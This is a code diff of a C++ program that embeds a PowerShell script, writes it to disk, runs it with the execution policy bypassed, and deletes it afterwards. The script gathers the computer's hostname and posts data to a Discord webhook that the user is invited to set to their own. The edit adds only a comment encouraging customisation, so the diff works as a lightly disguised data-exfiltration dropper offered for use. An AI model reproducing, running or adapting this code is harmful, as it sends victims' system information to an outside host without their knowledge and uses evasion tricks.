@@ -5,6 +5,13 @@
 #include <cstdlib>
 
 int main() {
+
+    /*
+        upfollowing powershell code
+        can be edited and adjusted
+        to your preferences
+    */
+    
     const std::string psScript =
         "$url = \"https://discord.com/api/webhooks/your-custom-webhook\";\n"   // make sure to replace with your own webhook url
         "$hostname = $env:COMPUTERNAME;\n"
@@ -21,11 +28,12 @@ int main() {
     if (!psFile.is_open()) {
         std::cerr << "failed" << std::endl;
         return 1;
-    }
+    }
+
 
     psFile << psScript;
     psFile.close();
     system("powershell -NoProfile -ExecutionPolicy Bypass -File test.ps1");
     std::remove("test.ps1");
     return 0;
-}
+}
